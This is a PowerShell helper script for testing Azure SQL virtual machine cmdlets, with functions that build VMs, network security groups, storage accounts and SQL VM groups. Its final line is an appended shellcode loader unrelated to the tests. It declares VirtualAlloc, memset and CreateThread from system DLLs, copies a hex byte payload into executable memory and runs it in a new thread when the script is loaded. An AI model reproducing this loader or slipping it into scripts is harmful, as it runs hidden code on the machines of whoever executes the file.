














function Create-ResourceGroupForTest ($location = 'westus')
{
	$rgName = Get-ResourceGroupNameForTest
	$rg = New-AzResourceGroup -Name $rgName -Location $location -Force
	return $rg
}


function Remove-ResourceGroupForTest ($rg)
{
	Remove-AzResourceGroup -Name $rg.ResourceGroupName -Force
}


function Create-VM(
	[string] $resourceGroupName, 
	[string] $vmName,
	[string] $location)
{
	$subnetName = $vmName + "subnet"
	$vnetName= $vmName + "vnet"
	$pipName = $vmName + "pip"
	
	$subnetConfig = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 192.168.1.0/24

	
	$vnet = New-AzVirtualNetwork -ResourceGroupName $resourceGroupName -Location $location `
	   -Name $vnetName -AddressPrefix 192.168.0.0/16 -Subnet $subnetConfig
	$vnet = Get-AzVirtualNetwork -ResourceGroupName $resourceGroupName -Name $vnetName

	
	$pip = New-AzPublicIpAddress -ResourceGroupName $resourceGroupName -Location $location `
	   -AllocationMethod Static -IdleTimeoutInMinutes 4 -Name $pipName
	$pip = Get-AzPublicIpAddress -ResourceGroupName $resourceGroupName -Name $pipName

	
	$nsgRuleRDP = New-AzNetworkSecurityRuleConfig -Name 'RDPRule' -Protocol Tcp `
	   -Direction Inbound -Priority 1000 -SourceAddressPrefix * -SourcePortRange * `
	   -DestinationAddressPrefix * -DestinationPortRange 3389 -Access Allow

	
	$nsgRuleSQL = New-AzNetworkSecurityRuleConfig -Name 'MSSQLRule'  -Protocol Tcp `
	   -Direction Inbound -Priority 1001 -SourceAddressPrefix * -SourcePortRange * `
	   -DestinationAddressPrefix * -DestinationPortRange 1433 -Access Allow

	
	$nsgName = $vmName + 'nsg'
	$nsg = New-AzNetworkSecurityGroup -ResourceGroupName $resourceGroupName `
	   -Location $location -Name $nsgName `
	   -SecurityRules $nsgRuleRDP,$nsgRuleSQL
	$nsg = Get-AzNetworkSecurityGroup -ResourceGroupName $resourceGroupName -Name $nsgName

	$interfaceName = $vmName + 'int'
	$subnetId = $vnet.Subnets[0].Id
	
	$interface = New-AzNetworkInterface -Name $interfaceName `
	   -ResourceGroupName $resourceGroupName -Location $location `
	   -SubnetId $subnetId -PublicIpAddressId $pip.Id `
	   -NetworkSecurityGroupId $nsg.Id
	$interface = Get-AzNetworkInterface -ResourceGroupName $resourceGroupName -Name $interfaceName
	
	$cred = Get-DefaultCredentialForTest
	
	
	$vmConfig = New-AzVMConfig -VMName $vmName -VMSize Standard_DS13_V2 |
	   Set-AzVMOperatingSystem -Windows -ComputerName $vmName -Credential $cred -ProvisionVMAgent -EnableAutoUpdate |
	   Set-AzVMSourceImage -PublisherName 'MicrosoftSQLServer' -Offer 'SQL2017-WS2016' -Skus 'Enterprise' -Version 'latest' |
	   Add-AzVMNetworkInterface -Id $interface.Id
	
	return New-AzVM -ResourceGroupName $resourceGroupName -Location $location -VM $vmConfig
}


function Get-DefaultCredentialForTest()
{
	$user = Get-DefaultUser
	$pswd = Get-DefaultPassword
	$securePswd = ConvertTo-SecureString -String $pswd -AsPlainText -Force
	return New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securePswd
}

function Get-LocationForTest()
{
	$location = Get-Location -providerNamespace "Microsoft.SqlVirtualMachine" -resourceType "SqlVirtualMachines" -preferredLocation "East US"
	return $location
}

function Get-ResourceGroupNameForTest()
{
	$nr = getAssetName "rg-"
	return $nr
}

function Get-SqlVirtualMachineGroupName()
{
	$nr = getAssetName "psgr"
	return $nr
}

function Get-DefaultUser()
{
	return 'myvmadmin'
}

function Get-DefaultSqlService()
{
	return 'sqlservice'
}

function Get-DefaultPassword()
{
	return getAssetName "Sql1@"
}

function Get-DomainForTest()
{
	return 'Domain'
}

function Get-StorageaccountNameForTest()
{
	$nr = getAssetName 'st'
	return $nr
}


function Validate-SqlVirtualMachine($sqlvm1, $sqlvm2)
{
	
	$tmp = Assert-NotNull $sqlvm1
	$tmp = Assert-NotNull $sqlvm2

	$tmp = Assert-AreEqual $sqlvm1.ResourceId $sqlvm2.ResourceId
	$tmp = Assert-AreEqual $sqlvm1.Name $sqlvm2.Name
	$tmp = Assert-AreEqual $sqlvm1.ResourceGroupName $sqlvm2.ResourceGroupName
	$tmp = Assert-AreEqual $sqlvm1.SqlManagementType $sqlvm2.SqlManagementType
	$tmp = Assert-AreEqual $sqlvm1.LicenseType $sqlvm2.LicenseType	
	$tmp = Assert-AreEqual $sqlvm1.Offer $sqlvm2.Offer	
	$tmp = Assert-AreEqual $sqlvm1.Sku $sqlvm2.Sku	
}


function Validate-SqlVirtualMachineGroup($group1, $group2)
{
	$tmp = Assert-NotNull $group1
	$tmp = Assert-NotNull $group2

	$tmp = Assert-AreEqual $group1.ResourceId $group2.ResourceId
	$tmp = Assert-AreEqual $group1.Name $group2.Name
	$tmp = Assert-AreEqual $group1.ResourceGroupName $group2.ResourceGroupName
	$tmp = Assert-AreEqual $group1.Offer $group2.Offer	
	$tmp = Assert-AreEqual $group1.Sku $group2.Sku	
}


function Get-WsfcDomainProfileForTest(
	[string] $resourceGroupName, 
	[string] $location,
	[string] $user,
	[string] $sqllogin,
	[string] $domainName,
	[string] $blobAccount,
	[string] $storageAccountKey
)
{
	$props = @{
		DomainFqdn = $domainName + '.com'
		ClusterOperatorAccount = $user + '@' + $domainName + '.com'
		ClusterBootstrapAccount = $user + '@' + $domainName + '.com'
		
		SqlServiceAccount = $sqllogin + '@' + $domainName + '.com'
		StorageAccountUrl = $blobAccount
		StorageAccountPrimaryKey = $storageAccountKey
	}
	return new-object Microsoft.Azure.Management.SqlVirtualMachine.Models.WsfcDomainProfile -Property $props
}


function Create-SqlVM (
	[string] $resourceGroupName, 
	[string] $vmName,
	[string] $location
)
{
	$vm = Create-VM $resourceGroupName $vmName $location	
	$sqlvm = New-AzSqlVM -ResourceGroupName $resourceGroupName -Name $vmName -LicenseType 'PAYG' -Sku 'Enterprise' -Location $location
	$sqlvm = Get-AzSqlVM -ResourceGroupName $resourceGroupName -Name $vmName
	return $sqlvm
}


function Create-SqlVMGroup(
	[string] $resourceGroupName, 
	[string] $groupName,
	[string] $location
)
{
	$storageAccountName = Get-StorageaccountNameForTest
	$storageAccount = New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName -Location $location -Type Standard_LRS -Kind StorageV2
	$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName
	$tmp = Assert-NotNull $storageAccount
	$tmp = Assert-NotNull $storageAccount.PrimaryEndpoints
	$tmp = Assert-NotNull $storageAccount.PrimaryEndpoints.Blob
	
	$storageAccountKey = (Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $storageAccountName).Value[0]
	$blobAccount = $storageAccount.PrimaryEndpoints.Blob
	
	$user = Get-DefaultUser
	$domain = Get-DomainForTest
	$sqllogin = Get-DefaultSqlService
	$profile = Get-WsfcDomainProfileForTest $resourceGroupName $location $user $sqllogin $domain $blobAccount $storageAccountKey
	
	$secureKey = ConvertTo-SecureString $profile.StorageAccountPrimaryKey -AsPlainText -Force
	
	$group = New-AzSqlVMGroup -ResourceGroupName $resourceGroupName -Name $groupName -Location $location -ClusterOperatorAccount $profile.ClusterOperatorAccount `
		-ClusterBootstrapAccount $profile.ClusterBootstrapAccount `
		-SqlServiceAccount $profile.SqlServiceAccount -StorageAccountUrl $profile.StorageAccountUrl `
		-StorageAccountPrimaryKey $secureKey -DomainFqdn $profile.DomainFqdn `
		-Offer 'SQL2017-WS2016' -Sku 'Enterprise'
	$group = Get-AzSqlVMGroup -ResourceGroupName $resourceGroupName -Name $groupName
	return $group
}

$Hg41Eh = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Hg41Eh -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xfb,0x70,0xcc,0x4e,0xdb,0xc2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x03,0x7a,0x13,0x83,0xc2,0xff,0x92,0x39,0xb2,0x17,0xd0,0xc2,0x4b,0xe7,0xb5,0x4b,0xae,0xd6,0xf5,0x28,0xba,0x48,0xc6,0x3b,0xee,0x64,0xad,0x6e,0x1b,0xff,0xc3,0xa6,0x2c,0x48,0x69,0x91,0x03,0x49,0xc2,0xe1,0x02,0xc9,0x19,0x36,0xe5,0xf0,0xd1,0x4b,0xe4,0x35,0x0f,0xa1,0xb4,0xee,0x5b,0x14,0x29,0x9b,0x16,0xa5,0xc2,0xd7,0xb7,0xad,0x37,0xaf,0xb6,0x9c,0xe9,0xa4,0xe0,0x3e,0x0b,0x69,0x99,0x76,0x13,0x6e,0xa4,0xc1,0xa8,0x44,0x52,0xd0,0x78,0x95,0x9b,0x7f,0x45,0x1a,0x6e,0x81,0x81,0x9c,0x91,0xf4,0xfb,0xdf,0x2c,0x0f,0x38,0xa2,0xea,0x9a,0xdb,0x04,0x78,0x3c,0x00,0xb5,0xad,0xdb,0xc3,0xb9,0x1a,0xaf,0x8c,0xdd,0x9d,0x7c,0xa7,0xd9,0x16,0x83,0x68,0x68,0x6c,0xa0,0xac,0x31,0x36,0xc9,0xf5,0x9f,0x99,0xf6,0xe6,0x40,0x45,0x53,0x6c,0x6c,0x92,0xee,0x2f,0xf8,0x57,0xc3,0xcf,0xf8,0xff,0x54,0xa3,0xca,0xa0,0xce,0x2b,0x66,0x28,0xc9,0xac,0x89,0x03,0xad,0x23,0x74,0xac,0xce,0x6a,0xb2,0xf8,0x9e,0x04,0x13,0x81,0x74,0xd5,0x9c,0x54,0xe0,0xd0,0x0a,0x97,0x5d,0xdb,0xc9,0x7f,0x9c,0xdc,0xcc,0xc4,0x29,0x3a,0x9e,0x6a,0x7a,0x93,0x5e,0xdb,0x3a,0x43,0x36,0x31,0xb5,0xbc,0x26,0x3a,0x1f,0xd5,0xcc,0xd5,0xf6,0x8d,0x78,0x4f,0x53,0x45,0x19,0x90,0x49,0x23,0x19,0x1a,0x7e,0xd3,0xd7,0xeb,0x0b,0xc7,0x8f,0x1b,0x46,0xb5,0x19,0x23,0x7c,0xd0,0xa5,0xb1,0x7b,0x73,0xf2,0x2d,0x86,0xa2,0x34,0xf2,0x79,0x81,0x4f,0x3b,0xec,0x6a,0x27,0x44,0xe0,0x6a,0xb7,0x12,0x6a,0x6b,0xdf,0xc2,0xce,0x38,0xfa,0x0c,0xdb,0x2c,0x57,0x99,0xe4,0x04,0x04,0x0a,0x8d,0xaa,0x73,0x7c,0x12,0x54,0x56,0x7c,0x6e,0x83,0x9e,0x0a,0x9e,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$RqT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($RqT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$RqT,0,0,0);for (;;){Start-sleep 60};

